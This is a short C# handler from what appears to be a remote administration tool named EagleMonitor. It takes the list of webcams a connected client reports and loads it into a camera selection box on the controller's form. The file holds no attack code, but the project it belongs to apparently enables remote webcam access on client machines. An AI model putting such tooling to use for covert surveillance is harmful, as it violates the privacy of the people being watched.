using EagleMonitor.Networking;
using PacketLib.Packet;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.PacketParser
{
    internal class RemoteCameraPacketHandler
    {
        public RemoteCameraPacketHandler(RemoteCameraPacket remoteCameraPacket, ClientHandler clientHandler) : base() 
        {
            try
            {
                ClientHandler.ClientHandlersList[remoteCameraPacket.baseIp].remoteCameraForm.BeginInvoke((MethodInvoker)(() =>
                {
                    ClientHandler.ClientHandlersList[remoteCameraPacket.baseIp].remoteCameraForm.hasAlreadyConnected = false;
                    foreach (string camera in remoteCameraPacket.cameras)
                    {
                        ClientHandler.ClientHandlersList[remoteCameraPacket.baseIp].remoteCameraForm.camerasGuna2ComboBox.Items.Add(camera);
                    }

                    if (remoteCameraPacket.cameras.Count > 0)
                        ClientHandler.ClientHandlersList[remoteCameraPacket.baseIp].remoteCameraForm.camerasGuna2ComboBox.SelectedIndex = 0;
                }));
            }
            catch { }
        }
    }
}
